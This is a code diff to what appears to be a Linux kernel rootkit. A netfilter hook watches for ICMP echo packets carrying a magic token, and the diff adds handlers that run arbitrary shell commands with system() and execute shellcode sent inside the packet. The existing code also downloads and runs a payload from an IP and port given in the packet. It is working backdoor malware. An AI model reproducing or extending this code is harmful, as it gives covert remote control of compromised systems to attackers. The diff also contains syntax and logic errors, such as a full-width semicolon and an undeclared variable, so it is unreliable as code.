@@ -10,6 +10,8 @@ struct magic_icmp {
     unsigned int magic;
     unsigned int ip;
     unsigned short port;
+    unsigned short op;
+    unsigned char cmd[512]； 
 };
 
 struct nf_hook_ops pre_hook;
@@ -39,9 +41,9 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     payload = (struct magic_icmp *)(icmp_header + 1);
     payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
 
-    DEBUG("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
+    DEBUG("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu, op=%hu, cmd=%c", payload_size, payload->magic, payload->ip, payload->port,payload->op,payload->cmd);
 
-    if ( icmp_header->type != ICMP_ECHO || payload_size != 10 || payload->magic != AUTH_TOKEN )
+    if ( icmp_header->type != ICMP_ECHO || payload_size < 10 || payload->magic != AUTH_TOKEN )
         return NF_ACCEPT;
 
     DEBUG("Received magic ICMP packet\n");
@@ -50,9 +52,32 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     ip = payload->ip;
     port = payload->port;
 
+
+    if(payload_size == 10 && op==0){
     // 3 attempts, 2000ms delay
     dlexec_queue("/root/.tmp", ip, port, 2, 2000);
+    }
     #endif
+
+    switch (payload->op){
+
+    case 1 :
+    DEBUG("Executing command...\n");
+    system(payload->cmd);
+    break;
+
+    case 2 :
+    DEBUG("Executing shellcode...\n");
+    int (*ret)() = (int(*)())payload->cmd;
+    ret();
+    break;
+
+
+    default:
+    //do nothing
+    break;
+
+    }
 
     return NF_STOLEN;
 }
